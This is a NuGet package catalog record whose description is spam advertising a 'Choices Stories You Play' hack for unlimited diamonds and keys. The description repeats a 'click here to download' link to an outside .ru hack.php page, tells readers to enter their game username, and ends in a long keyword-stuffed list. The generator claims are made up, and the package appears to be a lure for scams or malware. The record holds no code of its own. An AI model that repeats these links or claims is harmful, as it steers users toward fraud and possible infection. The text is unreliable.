{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.41.20/_choices-stories-you-play-hack-working-2022-version-vjk.2.2.19.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "97582178-e84a-4caf-986f-be11f6020eb2",
  "catalog:commitTimeStamp": "2022-01-26T10:41:20.1327154Z",
  "created": "2022-01-26T10:38:50.643Z",
  "description": "# _Choices Stories You Play hack Working 2022 Version vjk\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://5.bltadwin.ru/hack.php](http://5.bltadwin.ru/hack.php)\n\n\nto share some famous stories in this game Love Hacks. free - Choices-Stories-You-Play-Hack-Cheats-Unlimited-Diamonds-and-Keys-Generator-Android-iOS Choices Stories You Play Hack. Download The Latest Apk Version of Choices: Stories You Play MOD, Thank you for your time and thanks for hacking this game for us (seriously.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://5.bltadwin.ru/hack.php](http://5.bltadwin.ru/hack.php)\n\n · 1st Step: Connecting to your account. Enter your Choices Stories You Play username and select the platform where your account is active. Proceed by clicking the \" Continue \" button. 2nd Step: Generating Diamonds and Keys. Select the amount of Diamonds and Keys that you wish to generate.  · Pick your story from our constantly growing library with weekly chapter updates, fall in love, solve crimes and embark on epic fantasy adventures. Get the Choices Stories You Play hack tool and enjoy! How to hack Choices Stories You Play. It is quite easy! Just be sure to enter your current username from the game and determine how much diamonds and keys .  · Choices stories you play hack is a handy program used to regenerate additional quantity of keys and diamonds within a period of a blink of an eye. Choices stories you play hack | keys and diamonds cheats This choices stories you play hack no survey is built with very few surveys. 1, likes · 2 talking about this.\n\nchoices stories you play hacked apk, choices stories you play hack apk unlimited diamonds and keys, choices stories you play hack ios, choices stories you play hack ipa, choices stories you play hack 2020, choices stories you play hack reddit, choices stories you play hack no human verification or survey, choices stories you play hack tool, choices stories you play hack apk, choices stories you play hack android, choices stories you play hack apk iphone, choices stories you play hacked version, choices stories you play bluestacks hack, choices cheats stories you play hack, how to cheat in choices stories you play, choices stories you play diamonds hack, choices stories you play hack ios download, choices stories you play hack apk download, choices stories you play hack no download, choices stories you play hack for iphone, choices stories you play hack generator free, hack for choices stories you play, choices stories you play hack without human verification, how to get free diamonds in choices without human verification, choices stories you play hacked version ios, choices stories you play hack jailbreak, choices stories you play hack keys, choices stories you play unlimited keys hack, can lucky patcher hack choices stories you play, can choices be hacked with lucky patcher, choices stories you play hack mod, choices stories you play pc hack, choices stories you play hacks, how to hack choices stories you play, how to hack choices stories you play without human verification, choices stories you play vip hack, choices stories you play hack without verification, how to hack chapters without human verification, choices stories you play hack 2021, choices stories you play hacked, choices stories you play mod",
  "id": "_Choices-Stories-You-Play-hack-Working-2022-Version-vjk",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T10:40:54.543Z",
  "listed": true,
  "packageHash": "Noc/xzTsQmiNEe8MJnzzK/xCkCaW/i9d6W0jFoTgX58ILY1oU/aKAShbXF2NyJTJUkPVyC1FlxHzvGMCeIN3zw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11359,
  "published": "2022-01-26T10:38:50.643Z",
  "requireLicenseAcceptance": false,
  "title": "_Choices-Stories-You-Play-hack-Working-2022-Version-vjk",
  "verbatimVersion": "2.2.19",
  "version": "2.2.19",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.41.20/_choices-stories-you-play-hack-working-2022-version-vjk.2.2.19.json#zxtticjoxw.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1230,
      "fullName": "zxtticjoxw.nuspec",
      "length": 3807,
      "name": "zxtticjoxw.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.41.20/_choices-stories-you-play-hack-working-2022-version-vjk.2.2.19.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}